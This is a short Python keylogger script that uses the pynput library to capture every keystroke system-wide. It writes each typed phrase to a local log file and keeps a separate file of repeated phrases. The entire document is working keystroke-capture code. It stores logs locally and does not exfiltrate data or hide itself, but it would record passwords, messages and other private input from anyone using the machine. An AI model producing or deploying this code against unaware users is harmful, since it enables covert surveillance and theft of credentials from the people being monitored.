#Import necessary modules 'logging','defaultdict', 'Key', and 'Listener' 
from pynput.keyboard import Key, Listener
import logging
from collections import defaultdict

#Configure log file 'Keylog.txt' with DEBUG level for detail
logging.basicConfig(filename='Keylog.txt', level=logging.DEBUG, format="%(message)s")

#Set variable to store the current phrase that is typed
current_phrase = ""

# Set variable to keep track of occurances of each phrase
phrase_counts = defaultdict(int)

#Function for when a key is pressed
def on_press(key):
    global current_phrase
    
    #Set actions for when ENTER key is pressed
    if key == Key.enter:
        if current_phrase:
            #Log phrase with apostrophies removed
            logging.info(current_phrase.replace("'", ""))
            
            #Count occurance of current phrase
            phrase_counts[current_phrase] += 1  
            
            #Reset current phrase
            current_phrase = ""
            
            repeated_phrases = [phrase for phrase, count in phrase_counts.items() if count > 1]
            
            #Write repeated phrase to "RepeatedPhrases.txt" file
            with open("RepeatedPhrases.txt", "w") as output_file:
                for phrase in repeated_phrases:
                    #Set format for writing repeated phrase
                    output_file.write(f"Phrase '{phrase}' repeated {phrase_counts[phrase]} times\n")
    
    # Exclude Key.space and Key.backspace from being recorded
    elif key != Key.space and key != Key.backspace: 
        current_phrase += str(key)



#Function for when a key is released
def on_release(key):
    #Stop listener if ESC is pressed
    if key == Key.esc:
        return False

#Define when to start and stp listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
